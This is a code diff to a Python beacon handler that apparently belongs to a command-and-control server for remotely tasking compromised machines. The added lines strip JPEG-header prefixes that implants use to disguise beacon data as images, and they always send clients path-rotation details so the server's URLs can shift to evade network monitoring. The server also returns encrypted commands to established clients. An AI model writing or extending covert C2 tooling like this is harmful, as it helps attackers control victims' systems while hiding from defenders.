@@ -1,5 +1,7 @@
 import logging
 import json
+import base64
+import re
 
 logger = logging.getLogger(__name__)
 
@@ -32,6 +34,16 @@ class BeaconHandler(BaseHandler):
                 client_id = body_data.get('client_id')
                 system_info_raw = body_data.get('data')
                 rotation_id = body_data.get('rotation_id')
+                
+                # Strip JPEG headers if present
+                if system_info_raw and isinstance(system_info_raw, str):
+                    # Check for JPEG header patterns
+                    if system_info_raw.startswith("0xFFD8FF"):
+                        system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
+                        self.log_message(f"Removed JPEG header prefix '0xFFD8FF' from data")
+                    elif system_info_raw.startswith("FFD8FF"):
+                        system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
+                        self.log_message(f"Removed JPEG header prefix 'FFD8FF' from data")
                 
                 # Log the received client ID to verify
                 self.log_message(f"Client ID from request body: {client_id}")
@@ -100,9 +112,16 @@ class BeaconHandler(BaseHandler):
             else:
                 response_data["key_rotation"] = True
         
-        # Add path rotation info if requested
+        # Add path rotation info if requested - NOW INCLUDED IN RESPONSE BODY
         if include_rotation_info:
             rotation_info = self.path_router.get_rotation_info()
+            response_data["rotation_info"] = rotation_info
+        else:
+            # Always include basic rotation info for established clients
+            rotation_info = {
+                "current_rotation_id": self.path_router.path_manager.rotation_counter,
+                "next_rotation_time": self.path_router.path_manager.get_next_rotation_time()
+            }
             response_data["rotation_info"] = rotation_info
         
         # For established clients with encryption, encrypt the commands
